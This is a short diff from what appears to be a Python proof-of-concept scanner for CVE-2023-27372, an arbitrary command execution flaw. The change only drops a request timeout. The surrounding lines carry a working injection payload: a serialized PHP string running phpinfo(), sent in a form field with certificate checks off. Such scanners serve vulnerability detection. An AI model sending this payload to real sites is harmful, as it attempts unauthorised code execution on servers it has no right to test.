@@ -60,7 +60,7 @@ class poc:
                 "oubli": "s:19:\"<?php phpinfo(); ?>\";",
                 "nobot": ""
             }
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             if "Erreur" in result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞 (CVE-2023-27372)\033[0m
